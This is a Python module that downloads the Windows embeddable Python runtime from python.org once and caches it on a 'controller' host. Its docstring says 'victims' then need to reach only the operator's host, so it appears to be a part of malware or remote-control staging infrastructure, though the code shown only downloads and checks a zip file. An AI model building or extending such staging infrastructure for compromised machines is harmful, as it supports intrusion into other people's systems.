"""Cache the Windows embeddable Python on the controller.

Victims then need exactly one host: yours.  No python.org dependency at install
time, and no 11 MB binary in the repo.
"""

from __future__ import annotations

import os
import shutil
import tempfile
import threading
import time
import urllib.request
import zipfile

from .. import config

URL = ("https://www.python.org/ftp/python/{v}/python-{v}-embed-{arch}.zip")
_LOCK = threading.Lock()


def _target(data_dir: str, arch: str) -> str:
    return os.path.join(data_dir, f"py-{arch}.zip")


def cached_runtime(data_dir: str, arch: str = "amd64", timeout: float = 300.0) -> str:
    """Return a local path to an embeddable Python zip, downloading once."""
    arch = "win32" if arch == "win32" else "amd64"
    path = _target(data_dir, arch)
    if _valid(path):
        return path

    with _LOCK:
        if _valid(path):
            return path
        os.makedirs(data_dir, exist_ok=True)
        version = getattr(config, "EMBED_VERSION", "3.12.8")
        url = URL.format(v=version, arch=arch)

        last = None
        for attempt in range(4):
            tmp = os.path.join(tempfile.gettempdir(), f"wu-embed-{arch}.zip")
            try:
                request = urllib.request.Request(url, headers={"User-Agent": "SysPy"})
                with urllib.request.urlopen(request, timeout=timeout) as response:
                    with open(tmp, "wb") as handle:
                        shutil.copyfileobj(response, handle)
                if _valid(tmp):
                    os.replace(tmp, path)
                    return path
            except Exception as error:
                last = error
            time.sleep(2 * (attempt + 1))
        raise RuntimeError(f"cannot fetch {url}: {last}")


def _valid(path: str) -> bool:
    if not os.path.isfile(path) or os.path.getsize(path) < 1_000_000:
        return False
    try:
        with zipfile.ZipFile(path) as archive:
            return any(name.endswith("python.exe") or name.endswith("pythonw.exe")
                       for name in archive.namelist())
    except zipfile.BadZipFile:
        return False
